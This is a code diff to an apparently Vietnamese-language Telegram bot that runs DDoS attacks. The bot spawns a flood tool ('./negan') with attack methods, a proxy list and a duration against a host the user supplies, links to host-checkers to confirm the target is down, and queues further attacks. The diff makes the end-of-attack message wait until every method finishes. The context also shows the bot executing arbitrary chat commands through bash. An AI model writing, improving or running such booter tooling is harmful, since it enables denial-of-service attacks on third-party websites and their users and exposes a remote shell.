@@ -55,18 +55,22 @@ const initBot = () => {
 
             await bot.sendMessage(chatId, startMessage, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: 'Check Host', url: `https://check-host.net/check-http?host=${host}` }, { text: 'Host Tracker', url: `https://www.host-tracker.com/en/ic/check-http?url=${host}` }]] } });
 
+            let completedMethods = 0;
             methods.forEach(method => {
                 exec(`node --max-old-space-size=8192 ./negan -m ${method} -u ${host} -p live.txt --full true -s ${attackTime}`, { shell: '/bin/bash' }, (e, stdout, stderr) => {
-                    const completeMessage = JSON.stringify({ Status: "👽 END ATTACK 👽", Caller: caller, "PID Attack": pid, Website: host, Methods: methods.join(' '), Time: `${attackTime} Giây`, EndTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }) }, null, 2);
-                    bot.sendMessage(chatId, completeMessage, { parse_mode: 'HTML' });
-                    delete activeAttacks[pid];
-                    userProcesses[userId]--;
-                    currentProcesses--;
+                    completedMethods++;
+                    if (completedMethods === methods.length) {
+                        const completeMessage = JSON.stringify({ Status: "👽 END ATTACK 👽", Caller: caller, "PID Attack": pid, Website: host, Methods: methods.join(' '), Time: `${attackTime} Giây`, EndTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }) }, null, 2);
+                        bot.sendMessage(chatId, completeMessage, { parse_mode: 'HTML' });
+                        delete activeAttacks[pid];
+                        userProcesses[userId]--;
+                        currentProcesses--;
 
-                    if (queue.length) {
-                        const next = queue.shift();
-                        bot.sendMessage(next.chatId, `📥 Khởi động từ hàng đợi: ${next.host} ${next.time}s`);
-                        bot.emit('message', { chat: { id: next.chatId }, from: { id: next.userId, username: next.caller }, text: `${next.host} ${next.time}` });
+                        if (queue.length) {
+                            const next = queue.shift();
+                            bot.sendMessage(next.chatId, `📥 Khởi động từ hàng đợi: ${next.host} ${next.time}s`);
+                            bot.emit('message', { chat: { id: next.chatId }, from: { id: next.userId, username: next.caller }, text: `${next.host} ${next.time}` });
+                        }
                     }
                 });
             });
@@ -79,10 +83,6 @@ const initBot = () => {
             exec(cmd, { shell: '/bin/bash' }, (e, o, er) => bot.sendMessage(chatId, `🚀 Kết quả lệnh:\n<pre>${cmd}\n${o || er}</pre>`, { parse_mode: 'HTML' }));
         }
     });
-
-    bot.on('polling_error', console.error);
-    process.on('uncaughtException', console.error);
-    process.on('unhandledRejection', console.error);
 };
 
 initBot();
